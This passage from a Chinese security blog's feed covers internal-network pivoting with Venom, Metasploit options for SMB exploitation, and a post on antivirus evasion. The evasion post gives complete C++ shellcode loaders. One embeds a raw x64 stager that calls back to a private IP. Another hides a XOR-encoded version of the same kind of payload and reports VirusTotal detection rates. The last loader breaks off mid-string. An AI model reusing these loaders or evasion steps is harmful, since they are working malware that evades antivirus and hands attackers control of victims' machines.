title="VM3"></a>VM3</h1><p><img src="http://cdn.polowong.top/image-20220110220259266.png" alt="image-20220110220259266"></p><p><img src="http://cdn.polowong.top/image-20220110220307162.png" alt="image-20220110220307162"></p><p>看一下能不能执行命令（有360）</p><p><img src="http://cdn.polowong.top/image-20220110220459516.png" alt="image-20220110220459516"></p><p>没问题，listen一下，等待后续机器连接</p><p><img src="http://cdn.polowong.top/image-20220110221446402.png" alt="image-20220110221446402"></p><h1 id="VM4"><a href="#VM4" class="headerlink" title="VM4"></a>VM4</h1><p><img src="http://cdn.polowong.top/image-20220110223740859.png" alt="image-20220110223740859"></p><p>VM4连接VM3调了挺久，防火墙也关了，策略也都做好了，死活ping不通，过一会就好了- -</p><p><img src="http://cdn.polowong.top/image-20220110223902831.png" alt="image-20220110223902831"></p><p>这样所有的主机都拿到了权限并且可以开启socks代理打内网机器、上传下载文件。</p><h1 id="不出网上线CS"><a href="#不出网上线CS" class="headerlink" title="不出网上线CS"></a>不出网上线CS</h1><p>参考<a href="https://www.cy3ng.com/2021/07/29/1/%EF%BC%8C%E5%BE%85%E5%AE%8C%E6%88%90">https://www.cy3ng.com/2021/07/29/1/，待完成</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;为什么选择使用Venom？我认为是方便、快捷、便于理解。&lt;/p&gt;
&lt;h1 id=&quot;Venom介绍&quot;&gt;&lt;a href=&quot;#Venom介绍&quot; c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>redis主从复制/smb扫描备忘</title>
    <link href="https://polosec.github.io/2022/01/09/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-smb%E6%89%AB%E6%8F%8F%E5%A4%87%E5%BF%98/"/>
    <id>https://polosec.github.io/2022/01/09/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-smb%E6%89%AB%E6%8F%8F%E5%A4%87%E5%BF%98/</id>
    <published>2022-01-09T09:47:11.000Z</published>
    <updated>2022-01-09T09:53:56.290Z</updated>
    
    <content type="html"><![CDATA[<p>redis主从复制rce版本要求redis4.x或者5.x，6.x不可以。<br>msf利用smb漏洞时出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] Exploit failed: RubySMB::Error::EncryptionError Communication error with the remote host: Socket read returned nil. The server supports encryption but was not able to handle the encrypted request.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p>时可调整参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set SMB::AlwaysEncrypt false</span><br><span class="line">set SMB::ProtocolVersion 1</span><br></pre></td></tr></table></figure><p>MSF搜索参数：-S 指定字符串 比如scanner， type指定模块类型。<img src="http://cdn.polowong.top/16417219897919u9naujv.png?imageslim" alt="paste image"><br>SMB漏洞利用：扫描端口，获得版本，利用漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;redis主从复制rce版本要求redis4.x或者5.x，6.x不可以。&lt;br&gt;msf利用smb漏洞时出现&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>菜鸡的0基础免杀学习记录</title>
    <link href="https://polosec.github.io/2021/12/02/%E8%8F%9C%E9%B8%A1%E7%9A%840%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://polosec.github.io/2021/12/02/%E8%8F%9C%E9%B8%A1%E7%9A%840%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2021-12-02T08:16:03.000Z</published>
    <updated>2021-12-02T08:22:54.320Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言</p><p>其实一直对免杀挺感兴趣的，但一直没有下定决心系统的学习，只是半路拿来别人写的过来用一下，所以这次想从最基本的方法开始学习免杀，作为一个记录贴将持续更新免杀方法、代码以及其中我没掌握的知识点。</p></blockquote><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://hack-for.fun/bd13.html">https://hack-for.fun/bd13.html</a></p><h1 id="windows-API-源码函数学习"><a href="#windows-API-源码函数学习" class="headerlink" title="windows API/源码函数学习"></a>windows API/源码函数学习</h1><h2 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAlloc(</span><br><span class="line">  LPVOID lpAddress,内存基址</span><br><span class="line">  SIZE_T dwSize,大小</span><br><span class="line">  DWORD  flAllocationType,分配的类型</span><br><span class="line">  DWORD  flProtect 该内存的初始保护属性 RWX？</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="最简单直接加载shellcode"><a href="#最简单直接加载shellcode" class="headerlink" title="最简单直接加载shellcode"></a>最简单直接加载shellcode</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="comment">/* length: 892 bytes */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4f\x69\x42\x63\x00\x3b\xba\x07\xca\x0e\x71\x39\x4d\xf4\x73\xa0\x65\x60\xbc\x40\x25\xa0\x17\x51\xb3\xcc\xe5\x79\x2f\xfb\x20\x19\xa8\x1a\x58\x78\x64\x4e\xf7\x12\xef\x1d\x0e\xec\xe1\xf5\x65\x17\xc5\x2f\xe7\x82\xbb\x5e\x99\xa3\x50\x8b\x24\x8b\x9c\xf6\x14\xeb\x83\x4d\x85\x05\x85\x88\xf3\x0c\x81\xb1\x6a\x5a\x7d\x7b\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x53\x4c\x43\x43\x32\x3b\x20\x2e\x4e\x45\x54\x20\x43\x4c\x52\x20\x32\x2e\x30\x2e\x35\x30\x37\x32\x37\x29\x0d\x0a\x00\x69\x9b\xe0\x7e\xb2\xb6\x38\x6a\xbc\x63\x5e\xf9\x85\x9c\x22\x64\x17\x40\x5a\x37\x76\xe0\x60\x04\x54\xf3\x6a\x65\x0b\x6e\x1e\x90\x87\xb9\xeb\xf9\x85\x0b\x22\xd7\x64\x40\x7c\x76\x54\xd6\x27\x7c\x18\x2c\x97\x47\x5d\x0c\x53\x8e\xc8\xec\xcc\x00\xde\xfd\xe8\x67\x80\xbb\xe5\xc6\x61\x14\x13\x3c\x21\x4e\x06\xf9\xd9\x21\xa7\x9d\x4e\x63\xc8\x3b\xae\x6e\xf2\xe3\x58\x29\x14\x9a\xb1\xec\xdd\xc6\xe4\x62\xd0\x21\x7c\xe4\xcf\x21\x51\xfd\x16\x7f\xcd\xfe\x68\xdc\xda\x17\x1c\xf7\xab\x35\x79\x45\x31\x17\xf1\x30\xfd\xdd\x4f\xfd\x35\xcf\x94\xaa\xbd\xcb\x13\x48\xd3\xa5\x2f\xb8\x98\xed\x65\x54\x18\x35\xb2\x3c\x23\x1b\x8d\xb4\x0d\x62\xcf\xe1\x9b\x7b\xe7\x63\x2a\x86\x8d\x16\xe4\xda\xfb\xa4\x03\x4b\x8e\x1e\x03\x03\xa3\x4d\x11\x1d\x2a\xbb\xc9\xe1\xbf\xb0\xa5\x23\x0d\xd6\x6d\x34\x99\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x34\x38\x2e\x31\x00\x51\x09\xbf\x6d&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">    shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="免杀效果-vt-21-65"><a href="#免杀效果-vt-21-65" class="headerlink" title="免杀效果 vt 21/65"></a>免杀效果 vt 21/65</h2><p>59b33f3b4a74e8930a5207bf209f961f45e5eef277c19553c8c5ad3fe203c20d</p><p><img src="http://cdn.polowong.top/image-20211129152638091.png" alt="image-20211129152638091"></p><h1 id="简单加载器-shellcode-XOR"><a href="#简单加载器-shellcode-XOR" class="headerlink" title="简单加载器+shellcode XOR"></a>简单加载器+shellcode XOR</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xed\x59\x92\xf5\xe1\xf9\xd9\x11\x11\x11\x50\x40\x50\x41\x43\x40\x47\x59\x20\xc3\x74\x59\x9a\x43\x71\x59\x9a\x43\x09\x59\x9a\x43\x31\x59\x9a\x63\x41\x59\x1e\xa6\x5b\x5b\x5c\x20\xd8\x59\x20\xd1\xbd\x2d\x70\x6d\x13\x3d\x31\x50\xd0\xd8\x1c\x50\x10\xd0\xf3\xfc\x43\x50\x40\x59\x9a\x43\x31\x9a\x53\x2d\x59\x10\xc1\x77\x90\x69\x09\x1a\x13\x64\x63\x9a\x91\x99\x11\x11\x11\x59\x94\xd1\x65\x76\x59\x10\xc1\x41\x9a\x59\x09\x55\x9a\x51\x31\x58\x10\xc1\xf2\x47\x59\xee\xd8\x50\x9a\x25\x99\x59\x10\xc7\x5c\x20\xd8\x59\x20\xd1\xbd\x50\xd0\xd8\x1c\x50\x10\xd0\x29\xf1\x64\xe0\x5d\x12\x5d\x35\x19\x54\x28\xc0\x64\xc9\x49\x55\x9a\x51\x35\x58\x10\xc1\x77\x50\x9a\x1d\x59\x55\x9a\x51\x0d\x58\x10\xc1\x50\x9a\x15\x99\x59\x10\xc1\x50\x49\x50\x49\x4f\x48\x4b\x50\x49\x50\x48\x50\x4b\x59\x92\xfd\x31\x50\x43\xee\xf1\x49\x50\x48\x4b\x59\x9a\x03\xf8\x5e\xee\xee\xee\x4c\x7b\x11\x58\xaf\x66\x78\x7f\x78\x7f\x74\x65\x11\x50\x47\x58\x98\xf7\x5d\x98\xe0\x50\xab\x5d\x66\x37\x16\xee\xc4\x59\x20\xd8\x59\x20\xc3\x5c\x20\xd1\x5c\x20\xd8\x50\x41\x50\x41\x50\xab\x2b\x47\x68\xb6\xee\xc4\xfa\x62\x4b\x59\x98\xd0\x50\xa9\x41\x11\x11\x11\x5c\x20\xd8\x50\x40\x50\x40\x7b\x12\x50\x40\x50\xab\x46\x98\x8e\xd7\xee\xc4\xfa\x48\x4a\x59\x98\xd0\x59\x20\xc3\x58\x98\xc9\x5c\x20\xd8\x43\x79\x11\x13\x51\x95\x43\x43\x50\xab\xfa\x44\x3f\x2a\xee\xc4\x59\x98\xd7\x59\x92\xd2\x41\x7b\x1b\x4e\x59\x98\xe0\x59\x98\xcb\x58\xd6\xd1\xee\xee\xee\xee\x5c\x20\xd8\x43\x43\x50\xab\x3c\x17\x09\x6a\xee\xc4\x94\xd1\x1e\x94\x8c\x10\x11\x11\x59\xee\xde\x1e\x95\x9d\x10\x11\x11\xfa\xc2\xf8\xf5\x10\x11\x11\xf9\xb3\xee\xee\xee\x3e\x5e\x78\x53\x72\x11\x2a\xab\x16\xdb\x1f\x60\x28\x5c\xe5\x62\xb1\x74\x71\xad\x51\x34\xb1\x06\x40\xa2\xdd\xf4\x68\x3e\xea\x31\x08\xb9\x0b\x49\x69\x75\x5f\xe6\x03\xfe\x0c\x1f\xfd\xf0\xe4\x74\x06\xd4\x3e\xf6\x93\xaa\x4f\x88\xb2\x41\x9a\x35\x9a\x8d\xe7\x05\xfa\x92\x5c\x94\x14\x94\x99\xe2\x1d\x90\xa0\x7b\x4b\x6c\x6a\x11\x44\x62\x74\x63\x3c\x50\x76\x74\x7f\x65\x2b\x31\x5c\x7e\x6b\x78\x7d\x7d\x70\x3e\x25\x3f\x21\x31\x39\x72\x7e\x7c\x61\x70\x65\x78\x73\x7d\x74\x2a\x31\x5c\x42\x58\x54\x31\x29\x3f\x21\x2a\x31\x46\x78\x7f\x75\x7e\x66\x62\x31\x5f\x45\x31\x27\x3f\x20\x2a\x31\x46\x5e\x46\x27\x25\x2a\x31\x45\x63\x78\x75\x74\x7f\x65\x3e\x25\x3f\x21\x2a\x31\x42\x5d\x52\x52\x23\x2a\x31\x3f\x5f\x54\x45\x31\x52\x5d\x43\x31\x23\x3f\x21\x3f\x24\x21\x26\x23\x26\x38\x1c\x1b\x11\x78\x8a\xf1\x6f\xa3\xa7\x29\x7b\xad\x72\x4f\xe8\x94\x8d\x33\x75\x06\x51\x4b\x26\x67\xf1\x71\x15\x45\xe2\x7b\x74\x1a\x7f\x0f\x81\x96\xa8\xfa\xe8\x94\x1a\x33\xc6\x75\x51\x6d\x67\x45\xc7\x36\x6d\x09\x3d\x86\x56\x4c\x1d\x42\x9f\xd9\xfd\xdd\x11\xcf\xec\xf9\x76\x91\xaa\xf4\xd7\x70\x05\x02\x2d\x30\x5f\x17\xe8\xc8\x30\xb6\x8c\x5f\x72\xd9\x2a\xbf\x7f\xe3\xf2\x49\x38\x05\x8b\xa0\xfd\xcc\xd7\xf5\x73\xc1\x30\x6d\xf5\xde\x30\x40\xec\x07\x6e\xdc\xef\x79\xcd\xcb\x06\x0d\xe6\xba\x24\x68\x54\x20\x06\xe0\x21\xec\xcc\x5e\xec\x24\xde\x85\xbb\xac\xda\x02\x59\xc2\xb4\x3e\xa9\x89\xfc\x74\x45\x09\x24\xa3\x2d\x32\x0a\x9c\xa5\x1c\x73\xde\xf0\x8a\x6a\xf6\x72\x3b\x97\x9c\x07\xf5\xcb\xea\xb5\x12\x5a\x9f\x0f\x12\x12\xb2\x5c\x00\x0c\x3b\xaa\xd8\xf0\xae\xa1\xb4\x32\x1c\xc7\x7c\x25\x88\x11\x50\xaf\xe1\xa4\xb3\x47\xee\xc4\x59\x20\xd8\xab\x11\x11\x51\x11\x50\xa9\x11\x01\x11\x11\x50\xa8\x51\x11\x11\x11\x50\xab\x49\xb5\x42\xf4\xee\xc4\x59\x82\x42\x42\x59\x98\xf6\x59\x98\xe0\x59\x98\xcb\x50\xa9\x11\x31\x11\x11\x58\x98\xe8\x50\xab\x03\x87\x98\xf3\xee\xc4\x59\x92\xd5\x31\x94\xd1\x65\xa7\x77\x9a\x16\x59\x10\xd2\x94\xd1\x64\xc6\x49\x49\x49\x59\x14\x11\x11\x11\x11\x41\xd2\xf9\x8e\xec\xee\xee\x20\x28\x23\x3f\x20\x27\x29\x3f\x23\x25\x29\x3f\x20\x11\x40\x18\xae\x7c\x11&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取shellcode大小</span></span><br><span class="line">     shellcode_size = <span class="built_in"><span class="keyword">sizeof</span></span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    VirtualAlloc(</span></span><br><span class="line"><span class="comment">        NULL, // 基址</span></span><br><span class="line"><span class="comment">        800,  // 大小</span></span><br><span class="line"><span class="comment">        MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">        );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i] = buf[i] ^ <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)<span class="built_in">VirtualAlloc</span>(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        shellcode_size,</span><br><span class="line">        MEM_COMMIT,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CopyMemory</span>(shellcode, buf, shellcode_size);</span><br><span class="line"></span><br><span class="line">    hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">        (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">        &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="免杀效果-vt14-62"><a href="#免杀效果-vt14-62" class="headerlink" title="免杀效果  vt14/62"></a>免杀效果  vt14/62</h2><p>ac7eea68dbdf30730fb38ac43d0671c88aacdbcb7b8289740d69e8208923b2df</p><p><img src="http://cdn.polowong.top/image-20211202152221587.png" alt="image-20211202152221587"></p><h1 id="简单加载器-修改内存页属性-sleep-shellcode-xor异或"><a href="#简单加载器-修改内存页属性-sleep-shellcode-xor异或" class="headerlink" title="简单加载器+修改内存页属性+sleep+shellcode xor异或"></a>简单加载器+修改内存页属性+sleep+shellcode xor异或</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span 